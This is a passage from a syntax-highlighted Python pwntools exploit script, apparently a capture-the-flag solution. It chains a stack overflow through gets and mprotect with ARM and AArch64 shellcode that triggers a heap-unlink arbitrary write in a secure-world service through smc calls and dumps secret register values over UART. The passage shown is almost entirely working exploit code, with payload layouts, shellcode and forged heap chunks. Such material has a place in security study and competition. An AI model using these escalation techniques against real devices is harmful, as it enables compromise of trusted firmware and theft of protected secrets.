</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;localhost&#39;,6666)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./local_debug.sh&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./local_debug_secure.sh&#39;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_VA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x023fe000</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x4]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x8]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0xc]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x10]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x14]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x18]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x1c] 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r11, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> // SHARED MEM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r11, r11, #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r11, r11, #</span><span style="color:#e6db74">{</span>WORLD_SHARED_MEM_VA<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> // SHARED MEM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    strb r0, [r11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r11, r11, #0xc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r0, sp, r9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r1, r11, r9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb r0, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb r0, [r1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r9, r9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp r9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, =0x83000007
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;70 00 60 e1&#39;</span>)
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_PA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40033000</span>
</span></span><span style="display:flex;"><span>TCI_Data_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010225c</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xf0\x08\xe8</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># thumb switch</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov r10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r10, r10, #16 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r10, r10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r10, r10, #0x10c 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0xb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, r10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x0 // return to normal world
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(SEL0_shellcode))
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> SEL1_shellcode
</span></span><span style="display:flex;"><span>SEL0_shellcode_src <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40035500</span>
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000009000000</span>
</span></span><span style="display:flex;"><span>read_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>]
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00000000e4990b0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span><span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x1670</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0100060</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span> <span style="color:#75715e"># chunk 2</span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) <span style="color:#f92672">+</span> bytes(read_flag) <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x0, sp, x9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x9, x9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_PA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>(SEL0_shellcode_src)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x21, x9, #0xc // shellcode_dst, TCI buf payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alloc_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // alloc(i, 0x20, b&#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne alloc_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    free_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // free 2, 1, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x40, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sub x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne free_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    //trigger the vuln
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0xffff, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0xffff, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>(TCI_Data_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_tci:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x22, x8 // src
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(TCI_Data)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_tci
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // unlink AAW trigger
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, 0x0010, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, 0x0050, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #16] // data + 4
